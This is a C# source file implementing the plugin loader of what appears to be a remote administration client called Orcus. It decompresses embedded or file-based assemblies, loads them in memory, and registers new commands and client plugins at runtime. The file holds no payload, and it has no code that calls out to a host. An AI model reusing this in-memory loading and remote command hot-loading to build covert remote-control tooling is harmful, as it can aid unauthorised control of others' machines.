using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins.ClientPlugin;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Plugins
{
    public class PluginLoader
    {
        private static PluginLoader _current;

        private PluginLoader()
        {
            Loadables = new List<ILoadable>();
            ClientPlugins = new List<ClientController>();
            FactoryCommandPlugins = new List<IFactoryClientCommand>();
            Commands = new List<Type>();
            AvailablePlugins = new Dictionary<PluginResourceInfo, bool>();
        }

        public Dictionary<PluginResourceInfo, bool> AvailablePlugins { get; }
        public List<ClientController> ClientPlugins { get; }
        public List<IFactoryClientCommand> FactoryCommandPlugins { get; }
        public List<ILoadable> Loadables { get; }
        public List<Type> Commands { get; }

        public static PluginLoader Current => _current ?? (_current = new PluginLoader());

        public event EventHandler<CommandLoadedEventArgs> CommandLoaded;

        public void LoadPlugins(List<PluginResourceInfo> plugins)
        {
            if (plugins.Count == 0)
                return;

            var assembly = Assembly.GetEntryAssembly();
            var blacklistedPlugins = new[]
            {
                new Guid(new byte[]
                {0x74, 0x56, 0xee, 0xe6, 0x94, 0xbb, 0xc7, 0x46, 0x8b, 0xbc, 0x57, 0x29, 0xaf, 0x6e, 0x2c, 0x28})
            };

            var clientPluginIds = new Dictionary<ClientController, Guid>();

            foreach (var plugin in plugins)
            {
                if (blacklistedPlugins.Contains(plugin.Guid))
                    continue;

                AvailablePlugins.Add(plugin, false);
                var stream = assembly.GetManifestResourceStream(plugin.ResourceName);
                if (stream == null)
                    continue;

                Assembly pluginAssembly;
                using (var memoryStream = new MemoryStream())
                {
                    stream.CopyToEx(memoryStream);
                    stream.Dispose();
                    pluginAssembly = Assembly.Load(Decompress(memoryStream.ToArray()));
                }

                try
                {
                    var types = pluginAssembly.GetTypes();
                    switch (plugin.ResourceType)
                    {
                        case ResourceType.Command:
                            var commandType = types.First(x => x.IsSubclassOf(typeof (Command)));
                            Commands.Add(commandType);
                            break;
                        case ResourceType.ClientPlugin:
                            var clientType = types.First(x => x.IsSubclassOf(typeof (ClientController)));
                            var clientPlugin = (ClientController) Activator.CreateInstance(clientType);
                            try
                            {
                                clientPlugin.Initialize(ClientOperator.Instance);
                            }
                            catch (Exception ex)
                            {
                                ErrorReporter.Current.ReportError(ex,
                                    "Initialize() (ClientPlugin) at plugin: \"" + clientPlugin.GetType() + "\"");
                            }
                            ClientPlugins.Add(clientPlugin);
                            Loadables.Add(clientPlugin);
                            clientPluginIds.Add(clientPlugin, plugin.Guid);
                            break;
                        case ResourceType.FactoryCommand:
                            var factoryCommandPluginType =
                                types.First(x => x.GetInterface("IFactoryClientCommand") != null);
                            var factoryCommandPlugin =
                                (IFactoryClientCommand) Activator.CreateInstance(factoryCommandPluginType);
                            FactoryCommandPlugins.Add(factoryCommandPlugin);
                            try
                            {
                                factoryCommandPlugin.Factory.Initialize(ClientOperator.Instance);
                            }
                            catch (Exception ex)
                            {
                                ErrorReporter.Current.ReportError(ex,
                                    "Initialize() (FactoryCommand) at plugin: \"" + factoryCommandPlugin.GetType() +
                                    "\"");
                            }
                            Loadables.Add(factoryCommandPlugin.Factory);
                            break;
                        default:
                            continue;
                    }
                    AvailablePlugins[plugin] = true;
                }
                catch (Exception ex)
                {
                    ErrorReporter.Current.ReportError(ex,
                        $"Error loading and creating {plugin.ResourceType} of plugin {plugin.PluginName}");
                }
            }

            var requiredTypes = new List<Type>();
            var propertyProvider = new List<ClientControllerProvideEditablePropertyGrid>();
            var builderPropertyProvider = new List<ClientControllerBuilderSettings>();

            foreach (var clientController in ClientPlugins)
            {
                var providesProperties = clientController as ClientControllerProvideEditablePropertyGrid;
                if (providesProperties != null)
                {
                    requiredTypes.AddRange(providesProperties.Properties.Select(x => x.PropertyType));
                    propertyProvider.Add(providesProperties);
                    continue;
                }

                var providesBuilderSettings = clientController as ClientControllerBuilderSettings;
                if (providesBuilderSettings != null)
                {
                    requiredTypes.AddRange(providesBuilderSettings.BuilderSettings.Select(x => x.BuilderProperty.GetType()));
                    builderPropertyProvider.Add(providesBuilderSettings);
                }
            }

            if (propertyProvider.Count == 0 && builderPropertyProvider.Count == 0)
                return;

            var pluginSettings = Settings.GetPluginSettings(requiredTypes);

            foreach (var clientController in propertyProvider)
            {
                var settings =
                    pluginSettings.FirstOrDefault(x => x.PluginId == clientPluginIds[clientController]);
                if (settings != null)
                    PropertyGridExtensions.InitializeProperties(clientController, settings.Properties);
            }

            foreach (var clientController in builderPropertyProvider)
            {
                var settings =
                    pluginSettings.Where(x => x.PluginId == clientPluginIds[clientController]).ToList();
                if (settings.Count > 0)
                {
                    var builderSettings = new List<IBuilderProperty>();
                    foreach (var pluginSetting in settings)
                    {
                        var type = Type.GetType(pluginSetting.SettingsType);
                        if (type == null)
                            continue;

                        var settingInstance = Activator.CreateInstance(type) as IBuilderProperty;
                        if (settingInstance == null)
                            continue;

                        BuilderPropertyHelper.ApplyProperties(settingInstance, pluginSetting.Properties);
                        builderSettings.Add(settingInstance);
                    }

                    clientController.InitializeSettings(builderSettings);
                }
            }
        }

        public void LoadPlugin(string file, PluginVersion pluginVersion)
        {
            var pluginAssembly = Assembly.Load(Decompress(File.ReadAllBytes(file)));
            var types = pluginAssembly.GetTypes();
            var commandType = types.First(x => x.IsSubclassOf(typeof (Command)));

            try
            {
                var command = (Command) Activator.CreateInstance(commandType);
                if (command == null)
                {
                    ErrorReporter.Current.ReportError(new Exception("Command could not be created"), "LoadPlugin: Check");
                    return;
                }

                if (command.Identifier < 1000)
                {
                    ErrorReporter.Current.ReportError(new Exception("Command Id below 1000"), "LoadPlugin: Check");
                    return;
                }

                //prevent duplicate commands
                var allCommands = Commands.Select(x => (Command) Activator.CreateInstance(x));
                var existingCommand = allCommands.FirstOrDefault(x => x.Identifier == command.Identifier);
                if (existingCommand != null)
                    Commands.Remove(existingCommand.GetType());
            }
            catch (Exception ex)
            {
                ErrorReporter.Current.ReportError(ex, "LoadPlugin: Check");
                return;
            }

            Commands.Add(commandType);

            CommandLoaded?.Invoke(this, new CommandLoadedEventArgs(commandType));
        }

        private static byte[] Decompress(byte[] gzip)
        {
            using (var stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (var memory = new MemoryStream())
                {
                    int count;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    } while (count > 0);
                    return memory.ToArray();
                }
            }
        }
    }
}